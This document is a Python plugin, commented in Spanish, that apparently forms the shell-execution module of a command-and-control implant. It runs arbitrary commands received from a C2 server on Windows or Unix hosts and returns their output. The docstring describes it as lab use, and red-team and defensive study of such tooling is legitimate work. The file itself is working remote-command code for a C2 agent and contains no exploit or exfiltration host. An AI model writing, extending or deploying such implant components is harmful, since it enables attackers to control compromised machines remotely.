"""
plugins/shell.py — Ejecución de comandos de shell en el agente.

Uso en entorno de laboratorio controlado — el agente ejecuta solo
los comandos que recibe cifrados desde el servidor C2 autenticado.
"""

from __future__ import annotations

import asyncio
import os
import sys
import time
from typing import Any

from .base import BasePlugin


class ShellPlugin(BasePlugin):
    name = "shell"
    description = "Ejecución de comandos de shell"

    def actions(self) -> list[str]:
        return ["exec", "upload_result"]

    async def execute(self, action: str, args: dict[str, Any]) -> Any:
        if action == "exec":
            return await self._exec(
                cmd=args.get("cmd", ""),
                timeout=float(args.get("timeout", 10.0)),
                shell=bool(args.get("shell", True)),
                cwd=args.get("cwd"),
            )
        return {"error": f"Unknown action: {action}"}

    async def _exec(
        self,
        cmd: str,
        timeout: float = 10.0,
        shell: bool = True,
        cwd: str | None = None,
    ) -> dict:
        if not cmd:
            return {"ok": False, "error": "Empty command"}

        # Reemplazos de seguridad: comandos Windows que abren shells interactivos
        _WIN_ALIASES = {
            "cmd":  "cmd /c echo (use 'shell cmd /c <comando>' para ejecutar subcomandos)",
            "time": "time /t",
            "date": "date /t",
        }
        if sys.platform == "win32" and cmd.strip().lower() in _WIN_ALIASES:
            cmd = _WIN_ALIASES[cmd.strip().lower()]

        start = time.monotonic()
        try:
            # stdin=DEVNULL es critico: evita que comandos interactivos bloqueen
            # esperando input del usuario (cmd, time, pause, etc.)
            common_kwargs = dict(
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.DEVNULL,
                cwd=cwd,
            )
            if sys.platform == "win32":
                proc = await asyncio.create_subprocess_shell(cmd, **common_kwargs)
            else:
                proc = await asyncio.create_subprocess_shell(
                    cmd, env=os.environ.copy(), **common_kwargs
                )
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except asyncio.TimeoutError:
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass
                hint = ""
                if sys.platform == "win32" and cmd.strip().lower() in ("cmd", "powershell"):
                    hint = " (evita lanzar shells interactivos; usa 'shell cmd /c <cmd>')"
                return {
                    "ok": False,
                    "error": f"Command timed out after {timeout}s{hint}",
                    "cmd": cmd,
                }

            duration_ms = (time.monotonic() - start) * 1000
            return {
                "ok": proc.returncode == 0,
                "returncode": proc.returncode,
                "stdout": stdout.decode("utf-8", errors="replace"),
                "stderr": stderr.decode("utf-8", errors="replace"),
                "cmd": cmd,
                "duration_ms": round(duration_ms, 2),
            }
        except Exception as exc:
            return {"ok": False, "error": str(exc), "cmd": cmd}
